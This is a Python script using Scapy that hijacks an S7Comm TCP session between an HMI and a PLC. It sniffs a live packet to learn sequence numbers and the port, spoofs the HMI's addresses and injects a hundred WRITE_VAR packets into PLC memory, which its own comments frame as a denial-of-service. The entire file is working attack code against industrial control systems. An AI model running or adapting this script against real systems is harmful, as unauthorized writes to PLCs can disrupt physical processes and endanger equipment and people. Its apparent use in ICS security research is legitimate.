# Script to hijack the current connection

from scapy.all import *
from tpkt import TPKT
from cotp import COTP, COTP_TCP_Data
from s7 import S7COMM, S7COMM_Job,S7COMM_Item, S7COMM_Data_Item

import random
import time
import os
import json

# Defining the script variables 

PROJECT_PATH = os.path.dirname(os.path.abspath(__file__))

with open(os.path.join(PROJECT_PATH,"addresses.json"), "r") as f:
    ADDRESSES = json.load(f)

srcEth = ADDRESSES["srcEth"] # HMI MAC
dstEth = ADDRESSES["dstEth"]# PLC MAC
srcIP  = ADDRESSES["srcIP"] # HMI IP
dstIP  = ADDRESSES["dstIP"]# PLC IP
#srcPort = random.randint(1024, 65535) # Read from a valid packet so it cannot be random
dstPort = 102 # iso_tsap port
seqNr = 1
ackNr = 1

def updateSeqAndAckNrs(pkt):
    global seqNr
    global ackNr

    # Keeping track of tcp sequence and acknowledge numbers
    seqNr = pkt[TCP].ack
    ackNr = pkt[TCP].seq + len(pkt[TCP].payload)

def sendAck(sport):
    global seqNr
    global ackNr

    # Create the acknowledge packet
    ip      = IP(src=srcIP, dst=dstIP)
    ACK     = TCP(sport=sport, dport=dstPort, flags='A',seq=seqNr, ack=ackNr) # A = ACK
    ether = Ether(type=0x0800,src=srcEth,dst=dstEth) # 0x0800 -> IPv4
    pktACK  = ether / ip / ACK

    # Send acknowledge packet
    pktACK.show()
    sendp(pktACK)

def connectedSend(sport):
    global seqNr
    global ackNr

    # Create S7COMM WRITE_VAR PACKET to send until DoS
    ether = Ether(type=0x0800, src=srcEth, dst = dstEth) # 0x0800 -> IPv4
    ip = IP(src = srcIP, dst = dstIP, ttl = 128, id = random.randint(1, 65535), flags = 'DF') # DF = DON'T FRAGMENT
    tcp = TCP(sport = sport, dport = dstPort, seq = seqNr, ack = ackNr, flags = 'PA') # PA = PUSH, ACK
    
    # Hardcoded from a valid packet sniffed with Wireshark
    tpkt = TPKT(length=36)
    cotp = COTP(length=2,pdu_type=0xf0)
    cotp_data = COTP_TCP_Data(last_data_unit=1, tpdu_num=0x00)
    s7comm = S7COMM(protocol_id = 0x32,rosctr = 1,reserved = 0x0000,pdu_ref = 0x0100,param_length=14,data_length=5)
    s7commJob = S7COMM_Job(function=0x05)
    s7commItem = S7COMM_Item(varspec = 0x12, varspec_length = 10, syntaxid = 0x10, transp_size = 1, length = 1, db = 0, area = 0x83, addressBit = 0x0003e0)
    s7commDataItem = S7COMM_Data_Item (returncode = 0x00, transportsize = 0x03, length = 1, data = 1)
    pkt = ether / ip / tcp / tpkt / cotp / cotp_data / s7comm / s7commJob / s7commItem / s7commDataItem

    pkt.show2() # Show assembled packet
    sendp(pkt) # Send packets at layer 2

    time.sleep(0.5)

    # Update packet's sequence and acknowledge numbers according to sniffed lengths
    seqNr = pkt[TCP].seq + 36 #TODO: NOT HARDCODED
    ackNr = pkt[TCP].ack + 22 #TODO: NOT HARDCODED
    sendAck(sport)

    return pkt

# Wait for the periodic READ_VAR S7Comm packet to get the ack and seq numbers
Results = sniff(count=2, filter=f"tcp[tcpflags] & (tcp-push|tcp-ack) != 0 and (src host {dstIP})")
ResponsePkt = Results[1]
ResponsePkt.show()
srcport = ResponsePkt[TCP].dport # IMPORTANT SINCE IT IS SESSION HIJACKING

# Update packet's sequence and acknowledge numbers before sending
updateSeqAndAckNrs(ResponsePkt)

# IP and TCP checksums are not verified 
time.sleep(0.1)
pkt = connectedSend(srcport)

for i in range(100):
    time.sleep(0.1)
    pkt2 = connectedSend(srcport)